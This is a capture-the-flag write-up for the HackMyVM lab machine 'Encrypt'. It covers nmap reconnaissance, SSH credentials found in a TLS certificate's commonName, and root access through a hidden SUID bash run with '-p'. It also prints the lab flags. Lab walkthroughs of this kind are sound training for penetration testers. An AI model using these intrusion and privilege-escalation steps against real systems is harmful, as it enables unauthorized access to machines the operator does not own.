# HackMyVM — Encrypt

**Author:** M0rPH3U5  
**Difficulty:** Easy  
**OS:** Linux  
**Date:** 16.11.2026

---

## Reconnaissance

### Network Discovery

```bash
sudo netdiscover -r 172.20.10.0/24
```

Target identified: `172.20.10.3`

### Nmap

```bash
nmap -sV -sC -p- -T4 --min-rate 5000 172.20.10.3
```

```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 10.0p2 Debian 7+deb13u2
443/tcp open  ssl/http Apache httpd 2.4.67 ((Debian))
```

Hostname: `grenade.hmv`

```bash
echo "172.20.10.3 grenade.hmv" >> /etc/hosts
```

---

## Initial Access

### Credentials Leaked in SSL Certificate

Looking closely at the nmap output, the SSL certificate `commonName` field stood out:

```
ssl-cert: Subject: commonName=iot:Goat123!
```

The `commonName` contained plaintext SSH credentials: `iot` / `Goat123!`

This is exactly what the machine's hint was pointing at — *"Enumeration will always be your friend."*

### SSH Login

```bash
ssh iot@172.20.10.3
# password: Goat123!
```

Access granted. Grab the user flag:

```bash
cat ~/user.txt
```

```
8a86e2c71318c41c30c442a0605af4e638de10f2476a70d0d054c19070db1a9d
```

---

## Privilege Escalation

### SUID Enumeration

```bash
find / -perm -4000 -type f 2>/dev/null
```

Among the standard SUID binaries, one file stood out:

```
/var/tmp/.suid_bash
```

A hidden bash binary with the SUID bit set, placed in `/var/tmp/` with a leading dot to avoid easy detection.

### Exploiting SUID Bash

Running it with the `-p` flag (privileged mode — prevents bash from dropping the effective UID):

```bash
/var/tmp/.suid_bash -p
```

```
.suid_bash-5.2# id
uid=1000(iot) gid=1000(iot) euid=0(root)
```

Root achieved.

```bash
cat /root/root.txt
```

```
bc06e6ee33aee532901fc6cd2926ea0789751a6bfd47f7dea5654cdf68418b85
```

---

## Summary

| Stage | Technique |
|-------|-----------|
| Reconnaissance | Nmap SSL certificate inspection |
| Initial Access | Credentials in `commonName` → SSH |
| Privilege Escalation | SUID bash (`/var/tmp/.suid_bash -p`) |

## Key Takeaways

- Always read **every field** of nmap output — TLS/SSL certificate details are often overlooked but can contain sensitive information.
- **SUID enumeration** should be a reflex on every new shell. Hidden files (`dotfiles`) in world-writable directories like `/var/tmp/` are a classic privesc setup.
